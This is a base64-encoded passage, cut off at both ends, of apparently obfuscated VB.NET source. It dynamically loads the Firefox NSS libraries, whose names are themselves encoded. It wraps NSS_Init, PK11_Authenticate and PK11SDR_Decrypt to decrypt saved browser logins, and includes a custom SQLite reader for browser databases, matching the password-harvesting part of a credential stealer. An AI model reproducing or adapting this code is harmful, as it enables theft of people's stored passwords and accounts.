SgiYzNGc2FYUmxNeTVrYkd3PSIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyXSgiYm5OemRYUnBiRE11Wkd4cyIpKQ0KICAgICAgICBMb2FkTGlicmFyeShbMTA4XSAmIFsyNF0uWzQyXSgiYzI5bWRHOXJiak11Wkd4cyIpKQ0KICAgICAgICBOU1MzID0gTG9hZExpYnJhcnkoWzEwOF0gJiBbMjRdLls0Ml0oImJuTnpNeTVrYkd3PSIpKQ0KICAgICAgICBEaW0gcFByb2MgQXMgSW50UHRyID0gR2V0UHJvY0FkZHJlc3MoTlNTMywgIk5TU19Jbml0IikNCiAgICAgICAgRGltIGRsbCBBcyBETExGdW5jdGlvbkRlbGVnYXRlID0gRGlyZWN0Q2FzdChNYXJzaGFsLkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKHBQcm9jLCBHZXRUeXBlKERMTEZ1bmN0aW9uRGVsZWdhdGUpKSwgRExMRnVuY3Rpb25EZWxlZ2F0ZSkNCiAgICAgICAgUmV0dXJuIGRsbChjb25maWdkaXIpDQogICAgRW5kIEZ1bmN0aW9uDQogICAgPFVubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCk+IF8NCiAgICBQdWJsaWMgRGVsZWdhdGUgRnVuY3Rpb24gRExMRnVuY3Rpb25EZWxlZ2F0ZTIoKSBBcyBMb25nDQogICAgUHVibGljIEZ1bmN0aW9uIFBLMTFfR2V0SW50ZXJuYWxLZXlTbG90KCkgQXMgTG9uZw0KICAgICAgICBEaW0gcFByb2MgQXMgSW50UHRyID0gR2V0UHJvY0FkZHJlc3MoTlNTMywgIlBLMTFfR2V0SW50ZXJuYWxLZXlTbG90IikNCiAgICAgICAgRGltIGRsbCBBcyBETExGdW5jdGlvbkRlbGVnYXRlMiA9IERpcmVjdENhc3QoTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgR2V0VHlwZShETExGdW5jdGlvbkRlbGVnYXRlMikpLCBETExGdW5jdGlvbkRlbGVnYXRlMikNCiAgICAgICAgUmV0dXJuIGRsbCgpDQogICAgRW5kIEZ1bmN0aW9uDQogICAgPFVubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCk+IF8NCiAgICBQdWJsaWMgRGVsZWdhdGUgRnVuY3Rpb24gRExMRnVuY3Rpb25EZWxlZ2F0ZTMoQnlWYWwgc2xvdCBBcyBMb25nLCBCeVZhbCBsb2FkQ2VydHMgQXMgQm9vbGVhbiwgQnlWYWwgd2luY3ggQXMgTG9uZykgQXMgTG9uZw0KICAgIFB1YmxpYyBGdW5jdGlvbiBQSzExX0F1dGhlbnRpY2F0ZShCeVZhbCBzbG90IEFzIExvbmcsIEJ5VmFsIGxvYWRDZXJ0cyBBcyBCb29sZWFuLCBCeVZhbCB3aW5jeCBBcyBMb25nKSBBcyBMb25nDQogICAgICAgIERpbSBwUHJvYyBBcyBJbnRQdHIgPSBHZXRQcm9jQWRkcmVzcyhOU1MzLCAiUEsxMV9BdXRoZW50aWNhdGUiKQ0KICAgICAgICBEaW0gZGxsIEFzIERMTEZ1bmN0aW9uRGVsZWdhdGUzID0gRGlyZWN0Q2FzdChNYXJzaGFsLkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKHBQcm9jLCBHZXRUeXBlKERMTEZ1bmN0aW9uRGVsZWdhdGUzKSksIERMTEZ1bmN0aW9uRGVsZWdhdGUzKQ0KICAgICAgICBSZXR1cm4gZGxsKHNsb3QsIGxvYWRDZXJ0cywgd2luY3gpDQogICAgRW5kIEZ1bmN0aW9uDQogICAgPFVubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCk+IF8NCiAgICBQdWJsaWMgRGVsZWdhdGUgRnVuY3Rpb24gRExMRnVuY3Rpb25EZWxlZ2F0ZTQoQnlWYWwgYXJlbmFPcHQgQXMgSW50UHRyLCBCeVZhbCBvdXRJdGVtT3B0IEFzIEludFB0ciwgQnlWYWwgaW5TdHIgQXMgU3RyaW5nQnVpbGRlciwgQnlWYWwgaW5MZW4gQXMgSW50ZWdlcikgQXMgSW50ZWdlcg0KICAgIFB1YmxpYyBGdW5jdGlvbiBOU1NCYXNlNjRfRGVjb2RlQnVmZmVyKEJ5VmFsIGFyZW5hT3B0IEFzIEludFB0ciwgQnlWYWwgb3V0SXRlbU9wdCBBcyBJbnRQdHIsIEJ5VmFsIGluU3RyIEFzIFN0cmluZ0J1aWxkZXIsIEJ5VmFsIGluTGVuIEFzIEludGVnZXIpIEFzIEludGVnZXINCiAgICAgICAgRGltIHBQcm9jIEFzIEludFB0ciA9IEdldFByb2NBZGRyZXNzKE5TUzMsICJOU1NCYXNlNjRfRGVjb2RlQnVmZmVyIikNCiAgICAgICAgRGltIGRsbCBBcyBETExGdW5jdGlvbkRlbGVnYXRlNCA9IERpcmVjdENhc3QoTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgR2V0VHlwZShETExGdW5jdGlvbkRlbGVnYXRlNCkpLCBETExGdW5jdGlvbkRlbGVnYXRlNCkNCiAgICAgICAgUmV0dXJuIGRsbChhcmVuYU9wdCwgb3V0SXRlbU9wdCwgaW5TdHIsIGluTGVuKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIDxVbm1hbmFnZWRGdW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpPiBfDQogICAgUHVibGljIERlbGVnYXRlIEZ1bmN0aW9uIERMTEZ1bmN0aW9uRGVsZWdhdGU1KEJ5UmVmIGRhdGEgQXMgVFNFQ0l0ZW0sIEJ5UmVmIHJlc3VsdCBBcyBUU0VDSXRlbSwgQnlWYWwgY3ggQXMgSW50ZWdlcikgQXMgSW50ZWdlcg0KICAgIFB1YmxpYyBGdW5jdGlvbiBQSzExU0RSX0RlY3J5cHQoQnlSZWYgZGF0YSBBcyBUU0VDSXRlbSwgQnlSZWYgcmVzdWx0IEFzIFRTRUNJdGVtLCBCeVZhbCBjeCBBcyBJbnRlZ2VyKSBBcyBJbnRlZ2VyDQogICAgICAgIERpbSBwUHJvYyBBcyBJbnRQdHIgPSBHZXRQcm9jQWRkcmVzcyhOU1MzLCAiUEsxMVNEUl9EZWNyeXB0IikNCiAgICAgICAgRGltIGRsbCBBcyBETExGdW5jdGlvbkRlbGVnYXRlNSA9IERpcmVjdENhc3QoTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgR2V0VHlwZShETExGdW5jdGlvbkRlbGVnYXRlNSkpLCBETExGdW5jdGlvbkRlbGVnYXRlNSkNCiAgICAgICAgUmV0dXJuIGRsbChkYXRhLCByZXN1bHQsIGN4KQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBzaWdub24gQXMgU3RyaW5nDQogICAgUHVibGljIENsYXNzIFNRTGl0ZUJhc2UNCiAgICAgICAgPERsbEltcG9ydCgia2VybmVsMzIiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBIZWFwQWxsb2MoQnlWYWwgaGVhcCBBcyBJbnRQdHIsIEJ5VmFsIGZsYWdzIEFzIFVJbnQzMiwgQnlWYWwgYnl0ZXMgQXMgVUludDMyKSBBcyBJbnRQdHINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgia2VybmVsMzIiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBHZXRQcm9jZXNzSGVhcCgpIEFzIEludFB0cg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJrZXJuZWwzMiIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIGxzdHJsZW4oQnlWYWwgc3RyIEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfb3BlbihCeVZhbCBmaWxlTmFtZSBBcyBJbnRQdHIsIEJ5UmVmIGRhdGFiYXNlIEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19jbG9zZShCeVZhbCBkYXRhYmFzZSBBcyBJbnRQdHIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfZXhlYyhCeVZhbCBkYXRhYmFzZSBBcyBJbnRQdHIsIEJ5VmFsIHF1ZXJ5IEFzIEludFB0ciwgQnlWYWwgY2FsbGJhY2sgQXMgSW50UHRyLCBCeVZhbCBhcmd1bWVudHMgQXMgSW50UHRyLCBCeVJlZiBbZXJyb3JdIEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19lcnJtc2coQnlWYWwgZGF0YWJhc2UgQXMgSW50UHRyKSBBcyBJbnRQdHINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfcHJlcGFyZV92MihCeVZhbCBkYXRhYmFzZSBBcyBJbnRQdHIsIEJ5VmFsIHF1ZXJ5IEFzIEludFB0ciwgQnlWYWwgbGVuZ3RoIEFzIEludGVnZXIsIEJ5UmVmIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5UmVmIHRhaWwgQXMgSW50UHRyKSBBcyBJbnRlZ2VyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX3N0ZXAoQnlWYWwgc3RhdGVtZW50IEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19jb2x1bW5fY291bnQoQnlWYWwgc3RhdGVtZW50IEFzIEludFB0cikgQXMgSW50ZWdlcg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19jb2x1bW5fbmFtZShCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVZhbCBjb2x1bW5OdW1iZXIgQXMgSW50ZWdlcikgQXMgSW50UHRyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2NvbHVtbl90eXBlKEJ5VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5VmFsIGNvbHVtbk51bWJlciBBcyBJbnRlZ2VyKSBBcyBJbnRlZ2VyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2NvbHVtbl9pbnQoQnlWYWwgc3RhdGVtZW50IEFzIEludFB0ciwgQnlWYWwgY29sdW1uTnVtYmVyIEFzIEludGVnZXIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfY29sdW1uX2RvdWJsZShCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVZhbCBjb2x1bW5OdW1iZXIgQXMgSW50ZWdlcikgQXMgRG91YmxlDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2NvbHVtbl90ZXh0KEJ5VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5VmFsIGNvbHVtbk51bWJlciBBcyBJbnRlZ2VyKSBBcyBJbnRQdHINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgPERsbEltcG9ydCgic3FsaXRlMyIpPiBfDQogICAgICAgIFByaXZhdGUgU2hhcmVkIEZ1bmN0aW9uIHNxbGl0ZTNfY29sdW1uX2Jsb2IoQnlWYWwgc3RhdGVtZW50IEFzIEludFB0ciwgQnlWYWwgY29sdW1uTnVtYmVyIEFzIEludGVnZXIpIEFzIEludFB0cg0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICA8RGxsSW1wb3J0KCJzcWxpdGUzIik+IF8NCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgRnVuY3Rpb24gc3FsaXRlM19jb2x1bW5fdGFibGVfbmFtZShCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVZhbCBjb2x1bW5OdW1iZXIgQXMgSW50ZWdlcikgQXMgSW50UHRyDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIDxEbGxJbXBvcnQoInNxbGl0ZTMiKT4gXw0KICAgICAgICBQcml2YXRlIFNoYXJlZCBGdW5jdGlvbiBzcWxpdGUzX2ZpbmFsaXplKEJ5VmFsIGhhbmRsZSBBcyBJbnRQdHIpIEFzIEludGVnZXINCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAgJyBTUUxpdGUgY29uc3RhbnRzDQogICAgICAgIFByaXZhdGUgQ29uc3QgU1FMX09LIEFzIEludGVnZXIgPSAwDQogICAgICAgIFByaXZhdGUgQ29uc3QgU1FMX1JPVyBBcyBJbnRlZ2VyID0gMTAwDQogICAgICAgIFByaXZhdGUgQ29uc3QgU1FMX0RPTkUgQXMgSW50ZWdlciA9IDEwMQ0KICAgICAgICBQdWJsaWMgRW51bSBTUUxpdGVEYXRhVHlwZXMNCiAgICAgICAgICAgIElOVCA9IDENCiAgICAgICAgICAgIEZMT0FUDQogICAgICAgICAgICBURVhUDQogICAgICAgICAgICBCTE9CDQogICAgICAgICAgICBOVUxMDQogICAgICAgIEVuZCBFbnVtDQogICAgICAgIFByaXZhdGUgZGF0YWJhc2UgQXMgSW50UHRyDQogICAgICAgIFB1YmxpYyBTdWIgTmV3KCkNCiAgICAgICAgICAgIGRhdGFiYXNlID0gSW50UHRyLlplcm8NCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgU3ViIE5ldyhCeVZhbCBiYXNlTmFtZSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIE9wZW5EYXRhYmFzZShiYXNlTmFtZSkNCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgU3ViIE9wZW5EYXRhYmFzZShCeVZhbCBiYXNlTmFtZSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIElmIHNxbGl0ZTNfb3BlbihTdHJpbmdUb1BvaW50ZXIoYmFzZU5hbWUpLCBkYXRhYmFzZSkgPD4gU1FMX09LIFRoZW4NCiAgICAgICAgICAgICAgICBkYXRhYmFzZSA9IEludFB0ci5aZXJvDQogICAgICAgICAgICAgICAgVGhyb3cgTmV3IEV4Y2VwdGlvbigiRXJyb3Igd2l0aCBvcGVuaW5nIGRhdGFiYXNlICIgJiBiYXNlTmFtZSAmICIhIikNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBTdWIgQ2xvc2VEYXRhYmFzZSgpDQogICAgICAgICAgICBJZiBkYXRhYmFzZSA8PiBJbnRQdHIuWmVybyBUaGVuDQogICAgICAgICAgICAgICAgc3FsaXRlM19jbG9zZShkYXRhYmFzZSkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBGdW5jdGlvbiBHZXRUYWJsZXMoKSBBcyBBcnJheUxpc3QNCiAgICAgICAgICAgIERpbSBxdWVyeSBBcyBbU3RyaW5nXSA9ICJTRUxFQ1QgbmFtZSBGUk9NIHNxbGl0ZV9tYXN0ZXIgIiAmICJXSEVSRSB0eXBlIElOICgndGFibGUnLCd2aWV3JykgQU5EIG5hbWUgTk9UIExJS0UgJ3NxbGl0ZV8lJyIgJiAiVU5JT04gQUxMICIgJiAiU0VMRUNUIG5hbWUgRlJPTSBzcWxpdGVfdGVtcF9tYXN0ZXIgIiAmICJXSEVSRSB0eXBlIElOICgndGFibGUnLCd2aWV3JykgIiAmICJPUkRFUiBCWSAxIg0KICAgICAgICAgICAgRGltIHRhYmxlIEFzIERhdGFUYWJsZSA9IEV4ZWN1dGVRdWVyeShxdWVyeSkNCiAgICAgICAgICAgIERpbSBsaXN0IEFzIE5ldyBBcnJheUxpc3QoKQ0KICAgICAgICAgICAgRm9yIEVhY2ggcm93IEFzIERhdGFSb3cgSW4gdGFibGUuUm93cw0KICAgICAgICAgICAgICAgIGxpc3QuQWRkKHJvdy5JdGVtQXJyYXkoMCkuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgICAgIFJldHVybiBsaXN0DQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQdWJsaWMgU3ViIEV4ZWN1dGVOb25RdWVyeShCeVZhbCBxdWVyeSBBcyBbU3RyaW5nXSkNCiAgICAgICAgICAgIERpbSBbZXJyb3JdIEFzIEludFB0cg0KICAgICAgICAgICAgc3FsaXRlM19leGVjKGRhdGFiYXNlLCBTdHJpbmdUb1BvaW50ZXIocXVlcnkpLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIFtlcnJvcl0pDQogICAgICAgICAgICBJZiBbZXJyb3JdIDw+IEludFB0ci5aZXJvIFRoZW4NCiAgICAgICAgICAgICAgICBUaHJvdyBOZXcgRXhjZXB0aW9uKCgiRXJyb3Igd2l0aCBleGVjdXRpbmcgbm9uLXF1ZXJ5OiAiIiIgJiBxdWVyeSAmICIiIiEiICYgdmJMZikgKyBQb2ludGVyVG9TdHJpbmcoc3FsaXRlM19lcnJtc2coW2Vycm9yXSkpKQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIEVuZCBTdWINCiAgICAgICAgUHVibGljIEZ1bmN0aW9uIEV4ZWN1dGVRdWVyeShCeVZhbCBxdWVyeSBBcyBbU3RyaW5nXSkgQXMgRGF0YVRhYmxlDQogICAgICAgICAgICBEaW0gc3RhdGVtZW50IEFzIEludFB0cg0KICAgICAgICAgICAgRGltIGV4Y2Vzc0RhdGEgQXMgSW50UHRyDQogICAgICAgICAgICBzcWxpdGUzX3ByZXBhcmVfdjIoZGF0YWJhc2UsIFN0cmluZ1RvUG9pbnRlcihxdWVyeSksIEdldFBvaW50ZXJMZW5naHQoU3RyaW5nVG9Qb2ludGVyKHF1ZXJ5KSksIHN0YXRlbWVudCwgZXhjZXNzRGF0YSkNCiAgICAgICAgICAgIERpbSB0YWJsZSBBcyBOZXcgRGF0YVRhYmxlKCkNCiAgICAgICAgICAgIERpbSByZXN1bHQgQXMgSW50ZWdlciA9IFJlYWRGaXJzdFJvdyhzdGF0ZW1lbnQsIHRhYmxlKQ0KICAgICAgICAgICAgV2hpbGUgcmVzdWx0ID0gU1FMX1JPVw0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IFJlYWROZXh0Um93KHN0YXRlbWVudCwgdGFibGUpDQogICAgICAgICAgICBFbmQgV2hpbGUNCiAgICAgICAgICAgIHNxbGl0ZTNfZmluYWxpemUoc3RhdGVtZW50KQ0KICAgICAgICAgICAgUmV0dXJuIHRhYmxlDQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFJlYWRGaXJzdFJvdyhCeVZhbCBzdGF0ZW1lbnQgQXMgSW50UHRyLCBCeVJlZiB0YWJsZSBBcyBEYXRhVGFibGUpIEFzIEludGVnZXINCiAgICAgICAgICAgIHRhYmxlID0gTmV3IERhdGFUYWJsZSgicmVzdWx0VGFibGUiKQ0KICAgICAgICAgICAgRGltIHJlc3VsdFR5cGUgQXMgSW50ZWdlciA9IHNxbGl0ZTNfc3RlcChzdGF0ZW1lbnQpDQogICAgICAgICAgICBJZiByZXN1bHRUeXBlID0gU1FMX1JPVyBUaGVuDQogICAgICAgICAgICAgICAgRGltIGNvbHVtbkNvdW50IEFzIEludGVnZXIgPSBzcWxpdGUzX2NvbHVtbl9jb3VudChzdGF0ZW1lbnQpDQogICAgICAgICAgICAgICAgRGltIGNvbHVtbk5hbWUgQXMgW1N0cmluZ10gPSAiIg0KICAgICAgICAgICAgICAgIERpbSBjb2x1bW5UeXBlIEFzIEludGVnZXIgPSAwDQogICAgICAgICAgICAgICAgRGltIGNvbHVtblZhbHVlcyBBcyBPYmplY3QoKSA9IE5ldyBPYmplY3QoY29sdW1uQ291bnQgLSAxKSB7fQ0KICAgICAgICAgICAgICAgIEZvciBpIEFzIEludGVnZXIgPSAwIFRvIGNvbHVtbkNvdW50IC0gMQ0KICAgICAgICAgICAgICAgICAgICBjb2x1bW5OYW1lID0gUG9pbnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX25hbWUoc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgY29sdW1uVHlwZSA9IHNxbGl0ZTNfY29sdW1uX3R5cGUoc3RhdGVtZW50LCBpKQ0KICAgICAgICAgICAgICAgICAgICBTZWxlY3QgQ2FzZSBjb2x1bW5UeXBlDQogICAgICAgICAgICAgICAgICAgICAgICBDYXNlIENJbnQoU1FMaXRlRGF0YVR5cGVzLklOVCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5JbnQzMiIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSBzcWxpdGUzX2NvbHVtbl9pbnQoc3RhdGVtZW50LCBpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5GTE9BVCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5TaW5nbGUiKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gc3FsaXRlM19jb2x1bW5fZG91YmxlKHN0YXRlbWVudCwgaSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIENhc2UgQ0ludChTUUxpdGVEYXRhVHlwZXMuVEVYVCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5TdHJpbmciKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gUG9pbnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX3RleHQoc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIENhc2UgQ0ludChTUUxpdGVEYXRhVHlwZXMuQkxPQikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuQ29sdW1ucy5BZGQoY29sdW1uTmFtZSwgVHlwZS5bR2V0VHlwZV0oIlN5c3RlbS5TdHJpbmciKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gUG9pbnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX2Jsb2Ioc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIENhc2UgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIFRydWUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5Db2x1bW5zLkFkZChjb2x1bW5OYW1lLCBUeXBlLltHZXRUeXBlXSgiU3lzdGVtLlN0cmluZyIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSAiIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBFbmQgU2VsZWN0DQogICAgICAgICAgICAgICAgTmV4dA0KICAgICAgICAgICAgICAgIHRhYmxlLlJvd3MuQWRkKGNvbHVtblZhbHVlcykNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgUmV0dXJuIHNxbGl0ZTNfc3RlcChzdGF0ZW1lbnQpDQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFJlYWROZXh0Um93KEJ5VmFsIHN0YXRlbWVudCBBcyBJbnRQdHIsIEJ5UmVmIHRhYmxlIEFzIERhdGFUYWJsZSkgQXMgSW50ZWdlcg0KICAgICAgICAgICAgRGltIGNvbHVtbkNvdW50IEFzIEludGVnZXIgPSBzcWxpdGUzX2NvbHVtbl9jb3VudChzdGF0ZW1lbnQpDQoNCiAgICAgICAgICAgIERpbSBjb2x1bW5UeXBlIEFzIEludGVnZXIgPSAwDQogICAgICAgICAgICBEaW0gY29sdW1uVmFsdWVzIEFzIE9iamVjdCgpID0gTmV3IE9iamVjdChjb2x1bW5Db3VudCAtIDEpIHt9DQoNCiAgICAgICAgICAgIEZvciBpIEFzIEludGVnZXIgPSAwIFRvIGNvbHVtbkNvdW50IC0gMQ0KICAgICAgICAgICAgICAgIGNvbHVtblR5cGUgPSBzcWxpdGUzX2NvbHVtbl90eXBlKHN0YXRlbWVudCwgaSkNCg0KICAgICAgICAgICAgICAgIFNlbGVjdCBDYXNlIGNvbHVtblR5cGUNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5JTlQpDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSBzcWxpdGUzX2NvbHVtbl9pbnQoc3RhdGVtZW50LCBpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4aXQgU2VsZWN0DQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5GTE9BVCkNCiAgICAgICAgICAgICAgICAgICAgICAgIElmIFRydWUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbHVtblZhbHVlcyhpKSA9IHNxbGl0ZTNfY29sdW1uX2RvdWJsZShzdGF0ZW1lbnQsIGkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRXhpdCBTZWxlY3QNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBDY